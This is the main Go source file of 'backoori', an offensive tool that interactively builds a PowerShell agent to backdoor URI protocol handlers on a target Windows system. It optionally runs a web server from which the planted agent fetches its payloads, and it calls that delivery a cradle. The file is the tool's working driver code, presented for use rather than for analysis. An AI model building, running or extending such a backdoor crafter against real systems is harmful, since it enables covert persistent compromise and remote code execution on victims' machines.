package main

import (
	"flag"
	"github.com/giuliocomi/backoori/crafter"
	"net"
	"os"
)

const version = "0.8"

var (
	isHelpNeeded          = flag.Bool("help", false, "Display help details")
	jsonURIprotocols      = flag.String("protocols", "./resources/uri_protocols_sample.json", "Provide the JSON filename containing the URI protocols to backdoor on the target system")
	jsonPayloads          = flag.String("payloads", "./resources/payloads_sample.json", "Provide the JSON filename containing the payloads to use in the backdoored gadgets")
	isOnlinePayloadString = flag.String("online", "false", "Provide 'true' if wants agent to fetch the payloads via the webserver, 'false' otherwise to store the payloads directly in the agent PS file")
	shouldProxyRequest    = flag.String("proxy", "false", "Provide 'true' if transparently proxy request to default Universal App (you should check if proxying might work first for the specified URI)")
	gadgetList            []crafter.GadgetItem
	chosenPayload         crafter.Payload
	listeningIp           string
	httpPort, timeout     int
)

func main() {
	flag.Parse()
	// help
	crafter.HelpMenu(version)
	if *isHelpNeeded || !flag.Parsed() || flag.NFlag() == 0 {
		flag.PrintDefaults()
		os.Exit(1)
	}
	// start web server
	isOnlinePayload, shouldProxyRequest := crafter.FlagDialog(*isOnlinePayloadString, *shouldProxyRequest)
	if isOnlinePayload {
		listeningIp, httpPort, timeout = crafter.WebServerDialog()
		go crafter.SetupWebServer(net.ParseIP(listeningIp), httpPort)
	}

	uriList, availablePayloads := crafter.LoadResources(*jsonURIprotocols, *jsonPayloads)
	// menu
	for {
		uriEntry := uriList.UriList[crafter.UriToBackdoorDialog(uriList)]
		chosenPayload = availablePayloads.Payloads[crafter.PayloadDialog(availablePayloads)]
		chosenPayloadWithParams := crafter.ParamsDialog(chosenPayload)

		if isOnlinePayload {
			chosenPayloadWithParams.UniqueId = crafter.DeployCradleGadgetPayload(chosenPayloadWithParams) //important info is UniqueID
		}
		gadgetList = append(gadgetList, crafter.GadgetItem{UriEntry: uriEntry, Payload: chosenPayloadWithParams}) //contains info about payload and its name
		if !crafter.ChooseAnotherUriToBackdoorDialog() {
			break
		}
	}
	// Going to write payload agent to file
	crafter.OutputAgent(listeningIp, httpPort, isOnlinePayload, shouldProxyRequest, gadgetList)
	crafter.OnExitDialog(isOnlinePayload, listeningIp, httpPort, timeout)
}
